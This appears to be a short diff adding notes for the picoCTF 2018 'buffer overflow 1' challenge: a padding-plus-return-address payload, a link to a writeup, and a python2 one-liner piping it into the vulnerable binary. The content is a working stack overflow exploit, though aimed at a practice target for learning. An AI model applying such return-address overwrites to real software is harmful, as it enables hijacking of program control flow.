@@ -1,0 +1,4 @@
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xcb\x85\x04\x08
+https://github.com/PlatyPew/picoctf-2018-writeup/tree/master/Binary%20Exploitation/buffer%20overflow%201 
+
+python2 -c "print ('A'* 44 + '\xcb\x85\x04\x08') " | ./vuln
